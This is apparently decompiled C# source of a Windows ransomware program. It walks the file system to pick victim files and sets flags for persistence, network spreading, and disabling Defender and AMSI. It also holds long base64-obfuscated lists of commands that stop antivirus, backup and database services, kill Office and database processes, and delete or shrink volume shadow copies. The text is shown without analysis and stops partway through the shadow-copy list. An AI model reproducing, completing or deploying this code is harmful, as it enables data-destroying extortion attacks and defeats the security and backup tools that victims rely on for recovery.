using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Complex.Cryptography;
using Complex.NTFSDirect;
using Microsoft.Win32;

namespace Complex;

internal class Program
{
	public class RecursiveFileSearch
	{
		private static StringCollection log = new StringCollection();

		private static List<string> result = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("Инструкция") && !text.EndsWith(".mxf1bd") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(MyStartName)) || text.Contains(Base64Decode("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI=")))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
							{
								result.Add(text);
							}
							else if (File.Exists(text) && Size == "NO")
							{
								result.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				array3 = array2;
				foreach (string root2 in array3)
				{
					WalkDirectoryTree(root2);
				}
			}
			return result;
		}
	}

	private const int SHCNE_ASSOCCHANGED = 134217728;

	private const int SHCNF_FLUSH = 4096;

	public static string imha = "EVET";

	public static string[] files_;

	public static IEnumerable<DirectoryInfo> dirs;

	public static byte[] PasswordBytes = null;

	public static DirectoryInfo di;

	public static string Size = "NO";

	public static string Mb = "100000000";

	public static List<string> DizonList = new List<string>();

	public static List<string> DoneExtensions = new List<string>();

	public static string Persistence = "NO";

	public static string DynamicPass = "";

	public static string once = "";

	public static string UniqueId = "";

	public static string DeceiveMe = "NO";

	public static int rand = 0;

	public static string ReleaseLockedFiles = "YES";

	public static string AntiVM = "NO";

	public static string Delay = "NO";

	public static string DelayTime = "0";

	public static string DisableDefender = "NO";

	public static string DisableAMSI = "NO";

	public static string CriticalProcess = "YES";

	public static string WallpaperChanger = "NO";

	public static List<string> meltList = new List<string>
	{
		Base64Decode("bHNhc3MuZXhl"),
		Base64Decode("c3ZjaHN0LmV4ZQ=="),
		Base64Decode("Y3Jjc3MuZXhl"),
		Base64Decode("Y2hyb21lMzIuZXhl"),
		Base64Decode("ZmlyZWZveC5leGU="),
		Base64Decode("Y2FsYy5leGU="),
		Base64Decode("bXlzcWxkLmV4ZQ=="),
		Base64Decode("ZGxsaHN0LmV4ZQ=="),
		Base64Decode("b3BlcmEzMi5leGU="),
		Base64Decode("bWVtb3AuZXhl"),
		Base64Decode("c3Bvb2xjdi5leGU="),
		Base64Decode("Y3RmbW9tLmV4ZQ=="),
		Base64Decode("U2t5cGVBcHAuZXhl")
	};

	public static List<string> EncryptedDirs = new List<string>();

	public static string SpreadOverNetwork = "YES";

	public static string Live4Ever = "YES";

	public static string KillTM = "NO";

	public static List<string> EncryptedFiles = new List<string>();

	public static string FtpLog = "NO";

	private static string appGuid = "6edfbf01-e893-441d-989f-0d7c2aeef1d8";

	public static string MultipleThreads = "YES";

	public static string WoL = "NO";

	public static List<string> netShadowList = new List<string>
	{
		Base64Decode("c3RhcnQgRG5zY2FjaGUgL3k="),
		Base64Decode("c3RhcnQgRkRSZXNQdWIgL3k="),
		Base64Decode("c3RhcnQgU1NEUFNSViAveQ=="),
		Base64Decode("c3RhcnQgdXBucGhvc3QgL3k="),
		Base64Decode("c3RvcCBhdnBzdXMgL3k="),
		Base64Decode("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBtZmV3YyAveQ=="),
		Base64Decode("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBEZWZXYXRjaCAveQ=="),
		Base64Decode("c3RvcCBjY0V2dE1nciAveQ=="),
		Base64Decode("c3RvcCBjY1NldE1nciAveQ=="),
		Base64Decode("c3RvcCBTYXZSb2FtIC95"),
		Base64Decode("c3RvcCBSVFZzY2FuIC95"),
		Base64Decode("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		Base64Decode("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		Base64Decode("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBZb29CYWNrdXAgL3k="),
		Base64Decode("c3RvcCBZb29JVCAveQ=="),
		Base64Decode("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		Base64Decode("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		Base64Decode("c3RvcCBWU05BUFZTUyAveQ=="),
		Base64Decode("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		Base64Decode("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		Base64Decode("c3RvcCB2ZWVhbSAveQ=="),
		Base64Decode("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		Base64Decode("c3RvcCBBY3JTY2gyU3ZjIC95"),
		Base64Decode("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		Base64Decode("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		Base64Decode("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		Base64Decode("c3RvcCBzb3Bob3MgL3k="),
		Base64Decode("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		Base64Decode("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		Base64Decode("c3RvcCBJSVNBZG1pbiAveQ=="),
		Base64Decode("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		Base64Decode("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		Base64Decode("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		Base64Decode("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		Base64Decode("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		Base64Decode("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		Base64Decode("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		Base64Decode("c3RvcCBTYW1TcyAveQ=="),
		Base64Decode("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		Base64Decode("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		Base64Decode("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		Base64Decode("c3RvcCBQT1AzU3ZjIC95"),
		Base64Decode("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		Base64Decode("c3RvcCBTTVRQU3ZjIC95"),
		Base64Decode("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		Base64Decode("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		Base64Decode("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		Base64Decode("c3RvcCBTc3RwU3ZjIC95"),
		Base64Decode("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		Base64Decode("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		Base64Decode("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		Base64Decode("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		Base64Decode("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		Base64Decode("c3RvcCBVSTBEZXRlY3QgL3k="),
		Base64Decode("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		Base64Decode("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		Base64Decode("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		Base64Decode("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		Base64Decode("c3RvcCBXM1N2YyAveQ=="),
		Base64Decode("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		Base64Decode("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		Base64Decode("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		Base64Decode("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		Base64Decode("c3RvcCBNU09MQVAkVFBTIC95"),
		Base64Decode("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		Base64Decode("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		Base64Decode("c3RvcCBBY3JTY2gyU3ZjIC95"),
		Base64Decode("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		Base64Decode("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		Base64Decode("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		Base64Decode("c3RvcCBBUlNNIC95"),
		Base64Decode("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		Base64Decode("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		Base64Decode("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		Base64Decode("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		Base64Decode("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		Base64Decode("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		Base64Decode("c3RvcCBNU1NRTCRQUk9EIC95"),
		Base64Decode("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		Base64Decode("c3RvcCBBbnRpdmlydXMgL3k="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		Base64Decode("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		Base64Decode("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		Base64Decode("c3RvcCBBVlAgL3k="),
		Base64Decode("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		Base64Decode("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		Base64Decode("c3RvcCBEQ0FnZW50IC95"),
		Base64Decode("c3RvcCBiZWRiZyAveQ=="),
		Base64Decode("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		Base64Decode("c3RvcCBFaHR0cFNydiAveQ=="),
		Base64Decode("c3RvcCBNTVMgL3k="),
		Base64Decode("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		Base64Decode("c3RvcCBla3JuIC95"),
		Base64Decode("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		Base64Decode("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		Base64Decode("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		Base64Decode("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		Base64Decode("c3RvcCBNU1NRTCRUUFMgL3k="),
		Base64Decode("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBudHJ0c2NhbiAveQ=="),
		Base64Decode("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		Base64Decode("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		Base64Decode("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		Base64Decode("c3RvcCBFU0hBU1JWIC95"),
		Base64Decode("c3RvcCBTRFJTVkMgL3k="),
		Base64Decode("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		Base64Decode("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		Base64Decode("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		Base64Decode("c3RvcCBLQVZGUyAveQ=="),
		Base64Decode("c3RvcCBTUUxXcml0ZXIgL3k="),
		Base64Decode("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		Base64Decode("c3RvcCBLQVZGU0dUIC95"),
		Base64Decode("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		Base64Decode("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		Base64Decode("c3RvcCBrYXZmc3NscCAveQ=="),
		Base64Decode("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		Base64Decode("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		Base64Decode("c3RvcCBrbG5hZ2VudCAveQ=="),
		Base64Decode("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		Base64Decode("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		Base64Decode("c3RvcCBtYWNtbnN2YyAveQ=="),
		Base64Decode("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		Base64Decode("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		Base64Decode("c3RvcCBtYXN2YyAveQ=="),
		Base64Decode("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		Base64Decode("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		Base64Decode("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		Base64Decode("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		Base64Decode("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		Base64Decode("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		Base64Decode("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		Base64Decode("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		Base64Decode("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		Base64Decode("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		Base64Decode("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		Base64Decode("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		Base64Decode("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		Base64Decode("c3RvcCBNeVNRTDU3IC95"),
		Base64Decode("c3RvcCBNY1NoaWVsZCAveQ=="),
		Base64Decode("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		Base64Decode("c3RvcCBNeVNRTDgwIC95"),
		Base64Decode("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		Base64Decode("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		Base64Decode("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		Base64Decode("c3RvcCBtZmVmaXJlIC95"),
		Base64Decode("c3RvcCB3YmVuZ2luZSAveQ=="),
		Base64Decode("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		Base64Decode("c3RvcCBtZmVtbXMgL3k="),
		Base64Decode("c3RvcCB3YmVuZ2luZSAveQ=="),
		Base64Decode("c3RvcCBSRVN2YyAveQ=="),
		Base64Decode("c3RvcCBtZmV2dHAgL3k="),
		Base64Decode("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		Base64Decode("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		Base64Decode("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		Base64Decode("c3RvcCBzYWNzdnIgL3k="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		Base64Decode("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		Base64Decode("c3RvcCBTQVZTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		Base64Decode("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		Base64Decode("c3RvcCBTaE1vbml0b3IgL3k="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		Base64Decode("c3RvcCBTbWNpbnN0IC95"),
		Base64Decode("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		Base64Decode("c3RvcCBTbWNTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		Base64Decode("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		Base64Decode("c3RvcCBzb3Bob3NzcHMgL3k="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		Base64Decode("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		Base64Decode("c3RvcCBzd2lfZmlsdGVyIC95"),
		Base64Decode("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		Base64Decode("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		Base64Decode("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		Base64Decode("c3RvcCBzd2lfdXBkYXRlIC95"),
		Base64Decode("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		Base64Decode("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		Base64Decode("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		Base64Decode("c3RvcCBUbUNDU0YgL3k="),
		Base64Decode("c3RvcCBTUUxCcm93c2VyIC95"),
		Base64Decode("c3RvcCB0bWxpc3RlbiAveQ=="),
		Base64Decode("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		Base64Decode("c3RvcCBUcnVlS2V5IC95"),
		Base64Decode("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		Base64Decode("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		Base64Decode("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		Base64Decode("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		Base64Decode("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		Base64Decode("c3RvcCBXUlNWQyAveQ=="),
		Base64Decode("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		Base64Decode("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> scList = new List<string>
	{
		Base64Decode("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		Base64Decode("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		Base64Decode("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		Base64Decode("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		Base64Decode("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		Base64Decode("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> taskList = new List<string>
	{
		Base64Decode("L0lNIG1zcHViLmV4ZSAvRg=="),
		Base64Decode("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		Base64Decode("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		Base64Decode("L0lNIG15c3FsZC5leGUgL0Y="),
		Base64Decode("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		Base64Decode("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		Base64Decode("L0lNIGFnbnRzdmMuZXhlIC9G"),
		Base64Decode("L0lNIHRoZWJhdC5leGUgL0Y="),
		Base64Decode("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		Base64Decode("L0lNIGVuY3N2Yy5leGUgL0Y="),
		Base64Decode("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		Base64Decode("L0lNIENOVEFvU01nci5leGUgL0Y="),
		Base64Decode("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		Base64Decode("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		Base64Decode("L0lNIGRiZW5nNTAuZXhlIC9G"),
		Base64Decode("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		Base64Decode("L0lNIG9jb21tLmV4ZSAvRg=="),
		Base64Decode("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		Base64Decode("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		Base64Decode("L0lNIHpvb2x6LmV4ZSAvRg=="),
		Base64Decode("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		Base64Decode("L0lNIGRic25tcC5leGUgL0Y="),
		Base64Decode("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		Base64Decode("L0lNIG1zcHViLmV4ZSAvRg=="),
		Base64Decode("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		Base64Decode("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		Base64Decode("L0lNIG9uZW5vdGUuZXhlIC9G"),
		Base64Decode("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		Base64Decode("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		Base64Decode("L0lNIG91dGxvb2suZXhlIC9G"),
		Base64Decode("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		Base64Decode("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		Base64Decode("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		Base64Decode("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		Base64Decode("L0lNIHZpc2lvLmV4ZSAvRg=="),
		Base64Decode("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		Base64Decode("L0lNIHdpbndvcmQuZXhlIC9G"),
		Base64Decode("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		Base64Decode("L0lNIHdvcmRwYWQuZXhlIC9G"),
		Base64Decode("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		Base64Decode("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		Base64Decode("L0lNIG9jc3NkLmV4ZSAvRg=="),
		Base64Decode("L0lNIG9yYWNsZS5leGUgL0Y="),
		Base64Decode("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		Base64Decode("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		Base64Decode("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		Base64Decode("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> vssList = new List<string>
	{
		Base64Decode(ReverseString("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		Base64Decode(ReverseString("=IUTxADN9UmepNHeh12LgozY942bvAiOj1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		Base64Decode(ReverseString("kVGZuV3bi5Wd9UmepNHeh12LgozY942bvAiOj1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		Base64Decode(ReverseString("=IUTxADN9UmepNHeh12LgoDZ942bvAiOk1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		Base64Decode(ReverseString("kVGZuV3bi5Wd9UmepNHeh12LgoDZ942bvAiOk1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		Base64Decode(ReverseString("=IUTxADN9UmepNHeh12LgoTZ942bvAiOl1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		Base64Decode(ReverseString("kVGZuV3bi5Wd9UmepNHeh12LgoTZ942bvAiOl1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
